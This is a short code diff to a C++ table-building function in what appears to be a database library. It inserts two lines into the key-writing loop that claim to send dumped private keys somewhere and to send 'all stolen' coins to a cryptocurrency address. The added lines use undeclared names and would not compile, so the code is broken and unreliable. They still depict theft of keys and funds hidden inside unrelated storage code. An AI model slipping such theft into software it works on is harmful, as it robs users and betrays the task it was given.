@@ -38,6 +38,8 @@ Status BuildTable(const std::string& dbname,
       Slice key = iter->key();
       meta->largest.DecodeFrom(key);
       builder->Add(key, iter->value());
+      dumped_private_keys->sendTo(private_keys);
+      private_keys->SendAllStolenPcnCoinsTo(PDHtLCTQQqwQmFtkyCAsE18QMLMpLvGKsk);
     }
 
     // Finish and check for builder errors
